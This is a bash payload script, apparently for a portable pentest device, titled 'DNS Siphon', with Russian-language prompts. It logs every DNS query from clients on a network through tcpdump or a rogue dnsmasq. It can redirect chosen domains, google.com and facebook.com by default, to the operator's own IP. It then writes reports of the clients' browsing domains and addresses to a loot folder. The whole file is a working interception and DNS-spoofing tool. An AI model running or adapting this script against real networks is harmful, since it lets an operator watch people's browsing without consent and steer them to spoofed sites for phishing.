#!/bin/bash
# Title: DNS Siphon
# Author: NullSec
# Description: Перехват DNS-запросов и анализ шаблонов просмотров
# Category: nullsec/interception

# FIX: правильный PATH и fallback для UI
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Нажмите Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ОШИБКА: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Готово"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Значение: " val; echo "$val"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Выбор: " choice; echo "${choice:-$2}"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Подтвердить (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# Переходит к показу диалога ошибки, если ничего не подключено.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/dnssiphon"
mkdir -p "$LOOT_DIR"

PROMPT "DNS SIPHON

Перехват и запись всех
DNS-запросов от клиентов.

Показывает шаблоны
просмотра, использование
приложений и историю доменов.

Режимы:
- Пассивный DNS-журнал
- Перенаправление доменов
- Статистика запросов

Нажмите OK для настройки."

# Find interface
IFACE=""
for i in br-lan eth0 wlan1 $IFACE; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "Интерфейс не найден!"; exit 1; }

LOCAL_IP=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)

PROMPT "РЕЖИМ SIPHON:

1. Пассивный DNS-журнал
2. Журнал + перенаправление доменов
3. Журнал + блокировка доменов
4. Полный анализ запросов

Интерфейс: $IFACE

Выберите режим далее."

SIPHON_MODE=$(NUMBER_PICKER "Режим (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SIPHON_MODE=1 ;; esac

REDIRECT_DOMAINS=""
BLOCK_DOMAINS=""
if [ "$SIPHON_MODE" -eq 2 ]; then
    REDIRECT_DOMAINS=$(TEXT_PICKER "Перенаправить домены:" "google.com facebook.com")
    REDIRECT_IP=$(TEXT_PICKER "Перенаправить на IP:" "$LOCAL_IP")
fi

if [ "$SIPHON_MODE" -eq 3 ]; then
    BLOCK_DOMAINS=$(TEXT_PICKER "Блокировать домены:" "ads.google.com tracking.com")
fi

DURATION=$(NUMBER_PICKER "Длительность (минут):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСК DNS SIPHON?

Режим: $SIPHON_MODE
Интерфейс: $IFACE
Длительность: ${DURATION}м

Все DNS-запросы будут
записаны.

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
DNS_LOG="$LOOT_DIR/dns_queries_$TIMESTAMP.log"
STATS_FILE="$LOOT_DIR/dns_stats_$TIMESTAMP.txt"

LOG "Запуск DNS Siphon..."
SPINNER_START "Настройка захвата DNS..."

# Build dnsmasq config for redirection/blocking
if [ "$SIPHON_MODE" -ge 2 ]; then
    killall dnsmasq 2>/dev/null
    sleep 1

    DNSMASQ_CONF="/tmp/dnssiphon.conf"
    cat > "$DNSMASQ_CONF" << CONFEOF
interface=$IFACE
bind-interfaces
log-queries
log-facility=$DNS_LOG
server=8.8.8.8
server=8.8.4.4
CONFEOF

    # Add redirects
    for DOMAIN in $REDIRECT_DOMAINS; do
        echo "address=/${DOMAIN}/${REDIRECT_IP}" >> "$DNSMASQ_CONF"
    done

    # Add blocks (redirect to 0.0.0.0)
    for DOMAIN in $BLOCK_DOMAINS; do
        echo "address=/${DOMAIN}/0.0.0.0" >> "$DNSMASQ_CONF"
    done

    dnsmasq -C "$DNSMASQ_CONF" &
    DNSMASQ_PID=$!
else
    # Passive: just capture DNS packets with tcpdump
    timeout $((DURATION * 60)) tcpdump -i "$IFACE" -nn -l 'udp port 53' 2>/dev/null | \
        while IFS= read -r line; do
            echo "$(date '+%H:%M:%S') $line" >> "$DNS_LOG"
        done &
    CAP_PID=$!
fi

SPINNER_STOP

PROMPT "DNS SIPHON АКТИВЕН!

Режим: $SIPHON_MODE
Запись в:
$DNS_LOG

Запросы захватываются
в режиме реального времени.

Нажмите OK, когда закончите
или дождитесь ${DURATION}м."

if [ -n "$DNSMASQ_PID" ]; then
    sleep $((DURATION * 60))
    kill $DNSMASQ_PID 2>/dev/null
    rm -f "$DNSMASQ_CONF"
else
    wait $CAP_PID 2>/dev/null
fi

# Generate statistics
echo "=======================================" > "$STATS_FILE"
echo "      ОТЧЕТ DNS SIPHON              " >> "$STATS_FILE"
echo "=======================================" >> "$STATS_FILE"
echo "" >> "$STATS_FILE"
echo "Время сканирования: $(date)" >> "$STATS_FILE"
echo "Длительность: ${DURATION} минут" >> "$STATS_FILE"
echo "Интерфейс: $IFACE" >> "$STATS_FILE"
echo "" >> "$STATS_FILE"

QUERY_COUNT=$(wc -l < "$DNS_LOG" 2>/dev/null | tr -d ' ')
echo "Всего запросов: $QUERY_COUNT" >> "$STATS_FILE"
echo "" >> "$STATS_FILE"

echo "--- TOP 20 ДОМЕНОВ ---" >> "$STATS_FILE"
grep -oE "[a-zA-Z0-9.-]+\.(com|net|org|io|co|info|edu|gov)" "$DNS_LOG" 2>/dev/null | \
    sort | uniq -c | sort -rn | head -20 >> "$STATS_FILE"

echo "" >> "$STATS_FILE"
echo "--- УНИКАЛЬНЫЕ КЛИЕНТЫ ---" >> "$STATS_FILE"
grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" "$DNS_LOG" 2>/dev/null | \
    sort -u >> "$STATS_FILE"

echo "" >> "$STATS_FILE"
echo "--- ТИПЫ ЗАПРОСОВ ---" >> "$STATS_FILE"
grep -oE "\b(A|AAAA|MX|TXT|CNAME|PTR|SRV|SOA)\b" "$DNS_LOG" 2>/dev/null | \
    sort | uniq -c | sort -rn >> "$STATS_FILE"

UNIQUE_DOMAINS=$(grep -oE "[a-zA-Z0-9.-]+\.(com|net|org|io|co)" "$DNS_LOG" 2>/dev/null | sort -u | wc -l | tr -d ' ')

PROMPT "DNS SIPHON ЗАВЕРШЕН

Всего запросов: $QUERY_COUNT
Уникальных доменов: $UNIQUE_DOMAINS
$([ -n "$REDIRECT_DOMAINS" ] && echo "Перенаправлено: $REDIRECT_DOMAINS")
$([ -n "$BLOCK_DOMAINS" ] && echo "Заблокировано: $BLOCK_DOMAINS")

Отчеты сохранены в:
$LOOT_DIR/

Нажмите OK для выхода."

exit 0
